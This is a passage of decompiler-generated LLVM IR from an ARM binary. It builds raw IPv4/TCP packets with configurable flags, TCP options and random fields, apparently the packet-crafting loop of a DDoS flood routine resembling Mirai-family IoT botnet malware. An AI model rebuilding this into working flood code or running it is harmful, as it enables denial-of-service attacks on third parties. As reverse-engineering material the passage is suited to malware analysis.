  %v5_d5f8 = or i32 %v4_d5f8, %v1_d5f4
  %v3_d5fc = mul nuw nsw i32 %v1_d5ec, 256
  %tmp73 = udiv i32 %v6_d450, 256
  %v4_d608 = urem i32 %tmp73, 256
  %v5_d608 = or i32 %v4_d608, %v3_d5fc
  store i32 %v5_d608, i32* %r6.global-to-local, align 4
  %v1_d5e8 = mul i32 %v6_d434, 256
  %v3_d60c = and i32 %v1_d5e8, 65280
  store i32 %v3_d60c, i32* %r1.global-to-local, align 4
  %tmp74 = udiv i32 %v6_d434, 256
  %v1_d620 = urem i32 %v6_d49c, 2
  %tmp75 = udiv i32 %v7_d3d8, 256
  %v1_d62c = urem i32 %v6_d4b4, 2
  %v1_d630 = urem i32 %v6_d4e4, 2
  %sext12 = mul i32 %tmp74, 16777216
  %v4_d64c = sdiv i32 %sext12, 16777216
  %v1_d650 = urem i32 %v6_d4cc, 2
  %v1_d654 = urem i32 %v6_d4fc, 2
  %v1_d660 = urem i32 %v6_d514, 2
  store i32 %v1_d660, i32* %r0.global-to-local, align 4
  store i32 %v1_d5d8, i32* %r2.global-to-local, align 4
  %v3_d668 = ashr i32 %sext12, 31
  store i32 %v3_d668, i32* %r3.global-to-local, align 4
  store i32 %v1_d5ec, i32* %ip.global-to-local, align 4
  %v5_d67c = trunc i32 %v3_d668 to i8
  store i32 %v0_d5b8, i32* %r4.global-to-local, align 4
  store i32 %v0_d5b8, i32* %r5.global-to-local, align 4
  store i32 6, i32* %r7.global-to-local, align 4
  %sext = mul i32 %v6_d3f0, 16777216
  %v4_d6d8 = sdiv i32 %sext, 16777216
  %sext9 = mul i32 %v7_d3d8, 16777216
  %v4_d6e4 = sdiv i32 %sext9, 16777216
  %sext10 = mul i32 %tmp75, 16777216
  %v4_d6e8 = sdiv i32 %sext10, 16777216
  %tmp = sub nsw i32 0, %v1_d620
  %v4_d744 = and i32 %tmp, 32
  %tmp79 = sub nsw i32 0, %v1_d62c
  %v4_d758 = and i32 %tmp79, 16
  %tmp80 = sub nsw i32 0, %v1_d650
  %v4_d76c = and i32 %tmp80, 8
  %tmp81 = sub nsw i32 0, %v1_d630
  %v4_d780 = and i32 %tmp81, 4
  %tmp82 = sub nsw i32 0, %v1_d654
  %v3_d794 = and i32 %tmp82, 2
  %sext11 = mul i32 %v6_d450, 16777216
  %v7_d7c4 = sdiv i32 %sext11, 16777216
  br label %dec_label_pc_d690

dec_label_pc_d690:                                ; preds = %bb77, %dec_label_pc_d5d0
  store i32 1, i32* %r1.global-to-local, align 4
  store i32 128, i32* %r0.global-to-local, align 4
  %v2_d698 = call i32* @calloc(i32 128, i32 1)
  %v4_d698 = ptrtoint i32* %v2_d698 to i32
  store i32 %v4_d698, i32* %r0.global-to-local, align 4
  %v3_d69c = load i32, i32* %stack_var_-40, align 4
  store i32 %v3_d69c, i32* %r2.global-to-local, align 4
  %v1_d6a0 = load i32, i32* %sb.global-to-local, align 4
  %v2_d6a0 = load i32, i32* %r4.global-to-local, align 4
  %v5_d6a0 = mul i32 %v2_d6a0, 4
  %v6_d6a0 = add i32 %v5_d6a0, %v1_d6a0
  %v7_d6a0 = inttoptr i32 %v6_d6a0 to i32*
  store i32 %v4_d698, i32* %v7_d6a0, align 4
  %v0_d6a4 = load i32, i32* %sb.global-to-local, align 4
  %v1_d6a4 = load i32, i32* %r2.global-to-local, align 4
  %v4_d6a4 = mul i32 %v1_d6a4, 4
  %v5_d6a4 = add i32 %v4_d6a4, %v0_d6a4
  %v6_d6a4 = inttoptr i32 %v5_d6a4 to i32*
  %v7_d6a4 = load i32, i32* %v6_d6a4, align 4
  store i32 %v7_d6a4, i32* %r4.global-to-local, align 4
  %v1_d6a8 = inttoptr i32 %v7_d6a4 to i8*
  %v2_d6a8 = load i8, i8* %v1_d6a8, align 1
  %tmp83 = urem i8 %v2_d6a8, 16
  %v1_d6ac = zext i8 %tmp83 to i32
  %v1_d6b0 = or i32 %v1_d6ac, 64
  store i32 %v1_d6b0, i32* %r3.global-to-local, align 4
  %v1_d6b4 = trunc i32 %v1_d6b0 to i8
  store i8 %v1_d6b4, i8* %v1_d6a8, align 1
  %v0_d6b8 = load i32, i32* %r4.global-to-local, align 4
  %v1_d6b8 = inttoptr i32 %v0_d6b8 to i8*
  %v2_d6b8 = load i8, i8* %v1_d6b8, align 1
  %v1_d6bc = and i8 %v2_d6b8, -16
  %v1_d6c0 = or i8 %v1_d6bc, 5
  store i32 %v1_d41c, i32* %r0.global-to-local, align 4
  store i8 %v1_d6c0, i8* %v1_d6b8, align 1
  %v2_d6d0 = load i32, i32* %r4.global-to-local, align 4
  %v3_d6d0 = add i32 %v2_d6d0, 1
  %v4_d6d0 = inttoptr i32 %v3_d6d0 to i8*
  store i8 %v5_d3d4, i8* %v4_d6d0, align 1
  %v0_d6d4 = load i32, i32* %r0.global-to-local, align 4
  %v2_d6d4 = icmp eq i32 %v0_d6d4, 0
  store i1 %v2_d6d4, i1* %cpsr_z.global-to-local, align 1
  store i32 %v4_d6d8, i32* %r0.global-to-local, align 4
  %v2_d6e0 = load i32, i32* %r4.global-to-local, align 4
  %v3_d6e0 = add i32 %v2_d6e0, 3
  %v4_d6e0 = inttoptr i32 %v3_d6e0 to i8*
  store i8 60, i8* %v4_d6e0, align 1
  store i32 %v4_d6e4, i32* %ip.global-to-local, align 4
  store i32 %v4_d6e8, i32* %r3.global-to-local, align 4
  %v0_d6ec = load i32, i32* %r0.global-to-local, align 4
  %v1_d6ec = trunc i32 %v0_d6ec to i8
  %v2_d6ec = load i32, i32* %r4.global-to-local, align 4
  %v3_d6ec = add i32 %v2_d6ec, 8
  %v4_d6ec = inttoptr i32 %v3_d6ec to i8*
  store i8 %v1_d6ec, i8* %v4_d6ec, align 1
  %v0_d6f0 = load i32, i32* %r7.global-to-local, align 4
  %v1_d6f0 = trunc i32 %v0_d6f0 to i8
  %v2_d6f0 = load i32, i32* %r4.global-to-local, align 4
  %v3_d6f0 = add i32 %v2_d6f0, 9
  %v4_d6f0 = inttoptr i32 %v3_d6f0 to i8*
  store i8 %v1_d6f0, i8* %v4_d6f0, align 1
  %v3_d6f4 = load i32, i32* %stack_var_-40, align 4
  store i32 %v3_d6f4, i32* %r2.global-to-local, align 4
  %v0_d6f8 = load i32, i32* %r3.global-to-local, align 4
  %v1_d6f8 = trunc i32 %v0_d6f8 to i8
  %v2_d6f8 = load i32, i32* %r4.global-to-local, align 4
  %v3_d6f8 = add i32 %v2_d6f8, 4
  %v4_d6f8 = inttoptr i32 %v3_d6f8 to i8*
  store i8 %v1_d6f8, i8* %v4_d6f8, align 1
  %v0_d6fc = load i1, i1* %cpsr_z.global-to-local, align 1
  br i1 %v0_d6fc, label %.thread, label %bb

bb:                                               ; preds = %dec_label_pc_d690
  store i32 64, i32* %r3.global-to-local, align 4
  %v3_d700 = load i32, i32* %r4.global-to-local, align 4
  %v4_d700 = add i32 %v3_d700, 6
  %v5_d700 = inttoptr i32 %v4_d700 to i8*
  store i8 64, i8* %v5_d700, align 1
  %v0_d720.pre = load i1, i1* %cpsr_z.global-to-local, align 1
  br label %.thread

.thread:                                          ; preds = %dec_label_pc_d690, %bb
  %v0_d720 = phi i1 [ true, %dec_label_pc_d690 ], [ %v0_d720.pre, %bb ]
  %v0_d704 = load i32, i32* %r2.global-to-local, align 4
  %v5_d708 = mul i32 %v0_d704, 24
  store i32 %v5_d708, i32* %r3.global-to-local, align 4
  store i32 %v6_d530, i32* %r2.global-to-local, align 4
  %v1_d710 = load i32, i32* %r4.global-to-local, align 4
  %v2_d710 = add i32 %v1_d710, 12
  %v3_d710 = inttoptr i32 %v2_d710 to i32*
  store i32 %v6_d530, i32* %v3_d710, align 4
  %v0_d714 = load i32, i32* %r3.global-to-local, align 4
  %v1_d714 = load i32, i32* @r8, align 4
  %v2_d714 = add i32 %v1_d714, %v0_d714
  store i32 %v2_d714, i32* %r3.global-to-local, align 4
  %v1_d718 = add i32 %v2_d714, 16
  %v2_d718 = inttoptr i32 %v1_d718 to i32*
  %v3_d718 = load i32, i32* %v2_d718, align 4
  store i32 %v3_d718, i32* %r2.global-to-local, align 4
  store i32 %v4_d64c, i32* %r3.global-to-local, align 4
  br i1 %v0_d720, label %bb77, label %bb76

bb76:                                             ; preds = %.thread
  %v1_d720 = load i32, i32* %r5.global-to-local, align 4
  %v2_d720 = trunc i32 %v1_d720 to i8
  %v3_d720 = load i32, i32* %r4.global-to-local, align 4
  %v4_d720 = add i32 %v3_d720, 7
  %v5_d720 = inttoptr i32 %v4_d720 to i8*
  store i8 %v2_d720, i8* %v5_d720, align 1
  br label %bb77

bb77:                                             ; preds = %.thread, %bb76
  %v0_d724 = load i32, i32* %ip.global-to-local, align 4
  %v1_d724 = trunc i32 %v0_d724 to i8
  %v2_d724 = load i32, i32* %r4.global-to-local, align 4
  %v3_d724 = add i32 %v2_d724, 5
  %v4_d724 = inttoptr i32 %v3_d724 to i8*
  store i8 %v1_d724, i8* %v4_d724, align 1
  %v0_d728 = load i32, i32* %r5.global-to-local, align 4
  %v1_d728 = trunc i32 %v0_d728 to i8
  %v2_d728 = load i32, i32* %r4.global-to-local, align 4
  %v3_d728 = add i32 %v2_d728, 2
  %v4_d728 = inttoptr i32 %v3_d728 to i8*
  store i8 %v1_d728, i8* %v4_d728, align 1
  %v0_d72c = load i32, i32* %r2.global-to-local, align 4
  %v1_d72c = load i32, i32* %r4.global-to-local, align 4
  %v2_d72c = add i32 %v1_d72c, 16
  %v3_d72c = inttoptr i32 %v2_d72c to i32*
  store i32 %v0_d72c, i32* %v3_d72c, align 4
  %v0_d730 = load i32, i32* %r3.global-to-local, align 4
  %v1_d730 = trunc i32 %v0_d730 to i8
  %v2_d730 = load i32, i32* %r4.global-to-local, align 4
  %v3_d730 = add i32 %v2_d730, 20
  %v4_d730 = inttoptr i32 %v3_d730 to i8*
  store i8 %v1_d730, i8* %v4_d730, align 1
  %v0_d734 = load i32, i32* %r4.global-to-local, align 4
  %v1_d734 = add i32 %v0_d734, 20
  store i32 %v1_d734, i32* %r1.global-to-local, align 4
  %v1_d738 = add i32 %v0_d734, 33
  %v2_d738 = inttoptr i32 %v1_d738 to i8*
  %v3_d738 = load i8, i8* %v2_d738, align 1
  %v4_d738 = zext i8 %v3_d738 to i32
  store i32 %v1_d620, i32* %ip.global-to-local, align 4
  %v1_d740 = and i32 %v4_d738, 223
  %v5_d744 = or i32 %v1_d740, %v4_d744
  store i32 %v5_d744, i32* %r3.global-to-local, align 4
  %v1_d748 = trunc i32 %v5_d744 to i8
  store i8 %v1_d748, i8* %v2_d738, align 1
  %v0_d74c = load i32, i32* %r1.global-to-local, align 4
  %v1_d74c = add i32 %v0_d74c, 13
  %v2_d74c = inttoptr i32 %v1_d74c to i8*
  %v3_d74c = load i8, i8* %v2_d74c, align 1
  %v4_d74c = zext i8 %v3_d74c to i32
  store i32 %v1_d62c, i32* %r0.global-to-local, align 4
  %v1_d754 = and i32 %v4_d74c, 239
  %v5_d758 = or i32 %v1_d754, %v4_d758
  store i32 %v5_d758, i32* %r2.global-to-local, align 4
  %v1_d75c = trunc i32 %v5_d758 to i8
  store i8 %v1_d75c, i8* %v2_d74c, align 1
  %v0_d760 = load i32, i32* %r1.global-to-local, align 4
  %v1_d760 = add i32 %v0_d760, 13
  %v2_d760 = inttoptr i32 %v1_d760 to i8*
  %v3_d760 = load i8, i8* %v2_d760, align 1
  %v4_d760 = zext i8 %v3_d760 to i32
  store i32 %v1_d650, i32* %r2.global-to-local, align 4
  %v1_d768 = and i32 %v4_d760, 247
  %v5_d76c = or i32 %v1_d768, %v4_d76c
  store i32 %v5_d76c, i32* %r3.global-to-local, align 4
  %v1_d770 = trunc i32 %v5_d76c to i8
  store i8 %v1_d770, i8* %v2_d760, align 1
  %v0_d774 = load i32, i32* %r1.global-to-local, align 4
  %v1_d774 = add i32 %v0_d774, 13
  %v2_d774 = inttoptr i32 %v1_d774 to i8*
  %v3_d774 = load i8, i8* %v2_d774, align 1
  %v4_d774 = zext i8 %v3_d774 to i32
  store i32 %v1_d630, i32* %r3.global-to-local, align 4
  %v1_d77c = and i32 %v4_d774, 251
  %v5_d780 = or i32 %v1_d77c, %v4_d780
  store i32 %v5_d780, i32* %r2.global-to-local, align 4
  %v1_d784 = trunc i32 %v5_d780 to i8
  store i8 %v1_d784, i8* %v2_d774, align 1
  %v0_d788 = load i32, i32* %r1.global-to-local, align 4
  %v1_d788 = add i32 %v0_d788, 13
  %v2_d788 = inttoptr i32 %v1_d788 to i8*
  %v3_d788 = load i8, i8* %v2_d788, align 1
  %v4_d788 = zext i8 %v3_d788 to i32
  store i32 %v1_d654, i32* %ip.global-to-local, align 4
  %v1_d790 = and i32 %v4_d788, 253
  %v4_d794 = or i32 %v1_d790, %v3_d794
  store i32 %v4_d794, i32* %r3.global-to-local, align 4
  %v1_d798 = trunc i32 %v4_d794 to i8
  store i8 %v1_d798, i8* %v2_d788, align 1
  %v0_d79c = load i32, i32* %r1.global-to-local, align 4
  %v1_d79c = add i32 %v0_d79c, 12
  %v2_d79c = inttoptr i32 %v1_d79c to i8*
  %v3_d79c = load i8, i8* %v2_d79c, align 1
  %v4_d79c = zext i8 %v3_d79c to i32
  store i32 %v4_d79c, i32* %r2.global-to-local, align 4
  %v1_d7a0 = add i32 %v0_d79c, 13
  %v2_d7a0 = inttoptr i32 %v1_d7a0 to i8*
  %v3_d7a0 = load i8, i8* %v2_d7a0, align 1
  %v4_d7a0 = zext i8 %v3_d7a0 to i32
  %tmp84 = urem i8 %v3_d79c, 16
  %v1_d7a8 = zext i8 %tmp84 to i32
  %v1_d7ac = and i32 %v4_d7a0, 254
  %v2_d7b0 = or i32 %v1_d7ac, %v1_d660
  %v1_d7b4 = or i32 %v1_d7a8, 160
  store i32 %v1_d7b4, i32* %r2.global-to-local, align 4
  %v1_d7b8 = trunc i32 %v2_d7b0 to i8
  store i8 %v1_d7b8, i8* %v2_d7a0, align 1
  %v0_d7bc = load i32, i32* %r2.global-to-local, align 4
  %v1_d7bc = trunc i32 %v0_d7bc to i8
  %v2_d7bc = load i32, i32* %r1.global-to-local, align 4
  %v3_d7bc = add i32 %v2_d7bc, 12
  %v4_d7bc = inttoptr i32 %v3_d7bc to i8*
  store i8 %v1_d7bc, i8* %v4_d7bc, align 1
  store i32 %v7_d7c4, i32* %r3.global-to-local, align 4
  store i32 %v5_d5f8, i32* %ip.global-to-local, align 4
  %v2_d7cc = load i32, i32* %r1.global-to-local, align 4
  %v3_d7cc = add i32 %v2_d7cc, 1
  %v4_d7cc = inttoptr i32 %v3_d7cc to i8*
  store i8 %v5_d67c, i8* %v4_d7cc, align 1
  store i32 2, i32* %r0.global-to-local, align 4
  store i32 4, i32* %r2.global-to-local, align 4
  %v0_d7d8 = load i32, i32* %r3.global-to-local, align 4
  %v1_d7d8 = trunc i32 %v0_d7d8 to i8
  %v2_d7d8 = load i32, i32* %r1.global-to-local, align 4
  %v3_d7d8 = add i32 %v2_d7d8, 3
  %v4_d7d8 = inttoptr i32 %v3_d7d8 to i8*
  store i8 %v1_d7d8, i8* %v4_d7d8, align 1
  %v0_d7dc = load i32, i32* %ip.global-to-local, align 4
  %v1_d7dc = load i32, i32* %r1.global-to-local, align 4
  %v2_d7dc = add i32 %v1_d7dc, 4
  %v3_d7dc = inttoptr i32 %v2_d7dc to i32*
  store i32 %v0_d7dc, i32* %v3_d7dc, align 4
  %v0_d7e0 = load i32, i32* %r6.global-to-local, align 4
  %v1_d7e0 = trunc i32 %v0_d7e0 to i8
  %v2_d7e0 = load i32, i32* %r1.global-to-local, align 4
  %v3_d7e0 = add i32 %v2_d7e0, 2
  %v4_d7e0 = inttoptr i32 %v3_d7e0 to i8*
  store i8 %v1_d7e0, i8* %v4_d7e0, align 1
  %v0_d7e4 = load i32, i32* %r2.global-to-local, align 4
  %v1_d7e4 = trunc i32 %v0_d7e4 to i8
  %v2_d7e4 = load i32, i32* %r4.global-to-local, align 4
  %v3_d7e4 = add i32 %v2_d7e4, 41
  %v4_d7e4 = inttoptr i32 %v3_d7e4 to i8*
  store i8 %v1_d7e4, i8* %v4_d7e4, align 1
  %v0_d7e8 = load i32, i32* %r0.global-to-local, align 4
  %v1_d7e8 = trunc i32 %v0_d7e8 to i8
  %v2_d7e8 = load i32, i32* %r4.global-to-local, align 4
  %v3_d7e8 = add i32 %v2_d7e8, 40
  %v4_d7e8 = inttoptr i32 %v3_d7e8 to i8*
  store i8 %v1_d7e8, i8* %v4_d7e8, align 1
  %v0_d7ec = call i32 @function_105b0()
  %v1_d7f0 = urem i32 %v0_d7ec, 16
  %v1_d7f4 = or i32 %v1_d7f0, 1392
  %v1_d7f8 = add nuw nsw i32 %v1_d7f4, 8
  %v3_d7fc = mul nuw nsw i32 %v1_d7f8, 65536
  store i32 %v3_d7fc, i32* %r0.global-to-local, align 4
  %v3_d800 = mul nuw nsw i32 %v1_d7f8, 256
  %v1_d804 = and i32 %v3_d800, 65280
  %v5_d808 = or i32 %v1_d804, 5
  store i32 %v5_d808, i32* %r3.global-to-local, align 4
  %v2_d80c = load i32, i32* %r4.global-to-local, align 4
  %v3_d80c = add i32 %v2_d80c, 42
  %v4_d80c = inttoptr i32 %v3_d80c to i8*
  store i8 5, i8* %v4_d80c, align 1
  %v0_d810 = load i32, i32* %r3.global-to-local, align 4
  %v3_d810 = sdiv i32 %v0_d810, 256
  store i32 %v3_d810, i32* %r1.global-to-local, align 4
  %v0_d814 = load i32, i32* %r4.global-to-local, align 4
  store i32 8, i32* %r3.global-to-local, align 4
  %v1_d81c = trunc i32 %v3_d810 to i8
  %v3_d81c = add i32 %v0_d814, 43
  %v4_d81c = inttoptr i32 %v3_d81c to i8*
  store i8 %v1_d81c, i8* %v4_d81c, align 1
  store i32 2, i32* %ip.global-to-local, align 4
  %v0_d824 = load i32, i32* %r3.global-to-local, align 4
  %v1_d824 = trunc i32 %v0_d824 to i8
  %v2_d824 = load i32, i32* %r4.global-to-local, align 4
  %v3_d824 = add i32 %v2_d824, 46
  %v4_d824 = inttoptr i32 %v3_d824 to i8*
  store i8 %v1_d824, i8* %v4_d824, align 1
  store i32 10, i32* %r2.global-to-local, align 4
  store i32 4, i32* %r3.global-to-local, align 4
  %v2_d830 = load i32, i32* %r4.global-to-local, align 4
  %v3_d830 = add i32 %v2_d830, 47
  %v4_d830 = inttoptr i32 %v3_d830 to i8*
  store i8 10, i8* %v4_d830, align 1
  %v0_d834 = load i32, i32* %r3.global-to-local, align 4
  %v1_d834 = trunc i32 %v0_d834 to i8
  %v2_d834 = load i32, i32* %r4.global-to-local, align 4
  %v3_d834 = add i32 %v2_d834, 44
  %v4_d834 = inttoptr i32 %v3_d834 to i8*
  store i8 %v1_d834, i8* %v4_d834, align 1
  %v0_d838 = load i32, i32* %ip.global-to-local, align 4
  %v1_d838 = trunc i32 %v0_d838 to i8
  %v2_d838 = load i32, i32* %r4.global-to-local, align 4
  %v3_d838 = add i32 %v2_d838, 45
  %v4_d838 = inttoptr i32 %v3_d838 to i8*
  store i8 %v1_d838, i8* %v4_d838, align 1
  %v0_d83c = call i32 @function_105b0()
  store i32 %v0_d83c, i32* %r0.global-to-local, align 4
  store i32 3, i32* %r2.global-to-local, align 4
  store i32 1, i32* %r3.global-to-local, align 4
  %v1_d848 = load i32, i32* %r4.global-to-local, align 4
  %v2_d848 = add i32 %v1_d848, 48
  %v3_d848 = inttoptr i32 %v2_d848 to i32*
  store i32 %v0_d83c, i32* %v3_d848, align 4
  %v0_d84c = load i32, i32* %r3.global-to-local, align 4
  %v1_d84c = trunc i32 %v0_d84c to i8
  %v2_d84c = load i32, i32* %r4.global-to-local, align 4
  %v3_d84c = add i32 %v2_d84c, 56
  %v4_d84c = inttoptr i32 %v3_d84c to i8*
  store i8 %v1_d84c, i8* %v4_d84c, align 1
  %v0_d850 = load i32, i32* %r2.global-to-local, align 4
  %v1_d850 = trunc i32 %v0_d850 to i8
  %v2_d850 = load i32, i32* %r4.global-to-local, align 4
  %v3_d850 = add i32 %v2_d850, 58
  %v4_d850 = inttoptr i32 %v3_d850 to i8*
  store i8 %v1_d850, i8* %v4_d850, align 1
  %v0_d854 = load i32, i32* %r7.global-to-local, align 4
  %v1_d854 = trunc i32 %v0_d854 to i8
  %v2_d854 = load i32, i32* %r4.global-to-local, align 4
  %v3_d854 = add i32 %v2_d854, 59
  %v4_d854 = inttoptr i32 %v3_d854 to i8*
  store i8 %v1_d854, i8* %v4_d854, align 1
  %v0_d858 = load i32, i32* %r5.global-to-local, align 4
  %v1_d858 = load i32, i32* %r4.global-to-local, align 4
  %v2_d858 = add i32 %v1_d858, 52
  %v3_d858 = inttoptr i32 %v2_d858 to i32*
  store i32 %v0_d858, i32* %v3_d858, align 4
  %v0_d85c = load i32, i32* %r2.global-to-local, align 4
  %v1_d85c = trunc i32 %v0_d85c to i8
  %v2_d85c = load i32, i32* %r4.global-to-local, align 4
  %v3_d85c = add i32 %v2_d85c, 57
  %v4_d85c = inttoptr i32 %v3_d85c to i8*
  store i8 %v1_d85c, i8* %v4_d85c, align 1
  %v3_d860 = load i32, i32* %stack_var_-40, align 4
  store i32 %v3_d860, i32* %r3.global-to-local, align 4
  %v1_d864 = add i32 %v3_d860, 1
  store i32 %v1_d864, i32* %r4.global-to-local, align 4
  %v0_d868 = load i32, i32* %fp.global-to-local, align 4
  %v9_d868 = icmp eq i32 %v0_d868, %v1_d864
  store i1 %v9_d868, i1* %cpsr_z.global-to-local, align 1
  store i32 %v1_d864, i32* %stack_var_-40, align 4
  %v8_d870 = icmp sgt i32 %v0_d868, %v1_d864
  br i1 %v8_d870, label %dec_label_pc_d690, label %dec_label_pc_d874.preheader

dec_label_pc_d874.preheader:                      ; preds = %bb77, %dec_label_pc_d58c
  %v0_d87815 = phi i32 [ %v0_d5b4, %dec_label_pc_d58c ], [ %v0_d868, %bb77 ]
  %v2_d894 = icmp eq i32 %v6_d530, -1
  %v7_d894 = icmp eq i32 %v6_d530, -1
  %v9_da24 = icmp eq i32 %v3_d5a4, add (i32 ptrtoint ([3 x i8]* @global_var_10000.78 to i32), i32 -1)
  %v2_daa0 = icmp eq i32 %v1_d5b0, 0
  br label %dec_label_pc_d874

dec_label_pc_d874:                                ; preds = %dec_label_pc_dac0.dec_label_pc_d874_crit_edge, %dec_label_pc_d874.preheader
  %v0_d878 = phi i32 [ %v0_d878.pre, %dec_label_pc_dac0.dec_label_pc_d874_crit_edge ], [ %v0_d87815, %dec_label_pc_d874.preheader ]
  store i32 0, i32* %r3.global-to-local, align 4
  %v2_d878 = icmp eq i32 %v0_d878, 0
  store i1 %v2_d878, i1* %cpsr_z.global-to-local, align 1
  store i32 0, i32* %stack_var_-40, align 4
  %tmp78 = icmp slt i32 %v0_d878, 1
  br i1 %tmp78, label %dec_label_pc_dac0, label %dec_label_pc_d884

dec_label_pc_d884:                                ; preds = %dec_label_pc_d874
  store i32 0, i32* %r0.global-to-local, align 4
  store i32 0, i32* %r7.global-to-local, align 4
  br label %dec_label_pc_d98c

dec_label_pc_d890:                                ; preds = %dec_label_pc_d98c
  store i32 %v6_d530, i32* %r0.global-to-local, align 4
  store i1 %v7_d894, i1* %cpsr_z.global-to-local, align 1
  br i1 %v7_d894, label %dec_label_pc_da14, label %dec_label_pc_d89c

dec_label_pc_d89c:                                ; preds = %dec_label_pc_d9ac, %dec_label_pc_d890
  store i32 %v3_d5a4, i32* %r2.global-to-local, align 4
  store i32 add (i32 ptrtoint ([3 x i8]* @global_var_10000.78 to i32), i32 -1), i32* @r4, align 4
  store i1 %v9_da24, i1* %cpsr_z.global-to-local, align 1
  br i1 %v9_da24, label %dec_label_pc_da30, label %dec_label_pc_d8b0

dec_label_pc_d8b0:                                ; preds = %dec_label_pc_da14.dec_label_pc_d8b0_crit_edge, %dec_label_pc_d89c
  %v1_d8b4 = phi i32 [ %v1_d8b4.pre, %dec_label_pc_da14.dec_label_pc_d8b0_crit_edge ], [ add (i32 ptrtoint ([3 x i8]* @global_var_10000.78 to i32), i32 -1), %dec_label_pc_d89c ]
  store i32 %v3_d5a8, i32* %r3.global-to-local, align 4
  %v9_d8b4 = icmp eq i32 %v3_d5a8, %v1_d8b4
  store i1 %v9_d8b4, i1* %cpsr_z.global-to-local, align 1
  br i1 %v9_d8b4, label %dec_label_pc_da4c, label %dec_label_pc_d8bc

dec_label_pc_d8bc:                                ; preds = %dec_label_pc_da30.dec_label_pc_d8bc_crit_edge, %dec_label_pc_d8b0
  %v1_d8c0 = phi i32 [ %v1_d8c0.pre, %dec_label_pc_da30.dec_label_pc_d8bc_crit_edge ], [ %v1_d8b4, %dec_label_pc_d8b0 ]
  store i32 %v3_d5ac, i32* %ip.global-to-local, align 4
  %v9_d8c0 = icmp eq i32 %v3_d5ac, %v1_d8c0
  store i1 %v9_d8c0, i1* %cpsr_z.global-to-local, align 1
  br i1 %v9_d8c0, label %dec_label_pc_da68, label %dec_label_pc_d8c8

dec_label_pc_d8c8:                                ; preds = %dec_label_pc_da4c.dec_label_pc_d8c8_crit_edge, %dec_label_pc_d8bc
  %v1_d8cc = phi i32 [ %v1_d8cc.pre, %dec_label_pc_da4c.dec_label_pc_d8c8_crit_edge ], [ %v1_d8c0, %dec_label_pc_d8bc ]
  store i32 %v6_d46c, i32* %r0.global-to-local, align 4
  %v9_d8cc = icmp eq i32 %v6_d46c, %v1_d8cc
  store i1 %v9_d8cc, i1* %cpsr_z.global-to-local, align 1
  br i1 %v9_d8cc, label %dec_label_pc_da84, label %dec_label_pc_d8d4

dec_label_pc_d8d4:                                ; preds = %dec_label_pc_da68.dec_label_pc_d8d4_crit_edge, %dec_label_pc_d8c8
  %v1_d8d8 = phi i32 [ %v1_d8d8.pre, %dec_label_pc_da68.dec_label_pc_d8d4_crit_edge ], [ %v1_d8cc, %dec_label_pc_d8c8 ]
  store i32 %v6_d484, i32* %r2.global-to-local, align 4
  %v9_d8d8 = icmp eq i32 %v6_d484, %v1_d8d8
  store i1 %v9_d8d8, i1* %cpsr_z.global-to-local, align 1
  br i1 %v9_d8d8, label %dec_label_pc_da98, label %dec_label_pc_d8e0

dec_label_pc_d8e0:                                ; preds = %dec_label_pc_da84, %dec_label_pc_d8d4
  store i32 %v1_d5b0, i32* %r3.global-to-local, align 4
  store i1 %v2_daa0, i1* %cpsr_z.global-to-local, align 1
  br i1 %v2_daa0, label %dec_label_pc_d8ec, label %dec_label_pc_daac

dec_label_pc_d8ec:                                ; preds = %dec_label_pc_d8e0, %dec_label_pc_da98, %dec_label_pc_daac
  store i32 20, i32* %r1.global-to-local, align 4
  %v0_d8f0 = load i32, i32* %r7.global-to-local, align 4
  %v1_d8f0 = trunc i32 %v0_d8f0 to i8
  %v2_d8f0 = load i32, i32* @r5, align 4
  %v3_d8f0 = add i32 %v2_d8f0, 10
  %v4_d8f0 = inttoptr i32 %v3_d8f0 to i8*
  store i8 %v1_d8f0, i8* %v4_d8f0, align 1
  %v0_d8f4 = load i32, i32* %r7.global-to-local, align 4
  %v1_d8f4 = trunc i32 %v0_d8f4 to i8
  %v2_d8f4 = load i32, i32* @r5, align 4
  %v3_d8f4 = add i32 %v2_d8f4, 11
  %v4_d8f4 = inttoptr i32 %v3_d8f4 to i8*
  store i8 %v1_d8f4, i8* %v4_d8f4, align 1
  %v0_d8f8 = load i32, i32* @r5, align 4
  store i32 %v0_d8f8, i32* @r0, align 4
  %v2_d8fc = call i32 @function_f188(i32 %v0_d8f8, i32 20)
  %v3_d8fc = trunc i32 %v2_d8fc to i8
  %v4_d90023 = udiv i32 %v2_d8fc, 256
  %v1_d904 = trunc i32 %v4_d90023 to i8
  %v2_d904 = load i32, i32* @r5, align 4
  %v3_d904 = add i32 %v2_d904, 11
  %v4_d904 = inttoptr i32 %v3_d904 to i8*
  store i8 %v1_d904, i8* %v4_d904, align 1
  %v3_d908 = load i32, i32* @r5, align 4
  %v4_d908 = add i32 %v3_d908, 10
  %v5_d908 = inttoptr i32 %v4_d908 to i8*
  store i8 %v3_d8fc, i8* %v5_d908, align 1
  %v0_d90c = load i32, i32* @r6, align 4
  store i32 %v0_d90c, i32* @r1, align 4
  store i32 10240, i32* %r2.global-to-local, align 4
  store i32 40, i32* %r3.global-to-local, align 4
  %v0_d918 = load i32, i32* %r7.global-to-local, align 4
  %v1_d918 = trunc i32 %v0_d918 to i8
  %v3_d918 = add i32 %v0_d90c, 16
  %v4_d918 = inttoptr i32 %v3_d918 to i8*
  store i8 %v1_d918, i8* %v4_d918, align 1
  %v0_d91c = load i32, i32* %r7.global-to-local, align 4
  %v1_d91c = trunc i32 %v0_d91c to i8
  %v2_d91c = load i32, i32* @r6, align 4
  %v3_d91c = add i32 %v2_d91c, 17
  %v4_d91c = inttoptr i32 %v3_d91c to i8*
  store i8 %v1_d91c, i8* %v4_d91c, align 1
  %v0_d920 = load i32, i32* @r5, align 4
  store i32 %v0_d920, i32* %r0.global-to-local, align 4
  %v4_d924 = call i32 @function_f1e4(i32 %v0_d920, i32 %v0_d90c, i32 10240, i32 40)
  %v5_d924 = trunc i32 %v4_d924 to i8
  store i32 %v4_d924, i32* %r0.global-to-local, align 4
  %v4_d92824 = udiv i32 %v4_d924, 256
  %v1_d92c = trunc i32 %v4_d92824 to i8
  %v2_d92c = load i32, i32* @r6, align 4
  %v3_d92c = add i32 %v2_d92c, 17
  %v4_d92c = inttoptr i32 %v3_d92c to i8*
  store i8 %v1_d92c, i8* %v4_d92c, align 1
  %v3_d930 = load i32, i32* @r6, align 4
  %v4_d930 = add i32 %v3_d930, 16
  %v5_d930 = inttoptr i32 %v4_d930 to i8*
  store i8 %v5_d924, i8* %v5_d930, align 1
  %v3_d934 = load i32, i32* %stack_var_-40, align 4
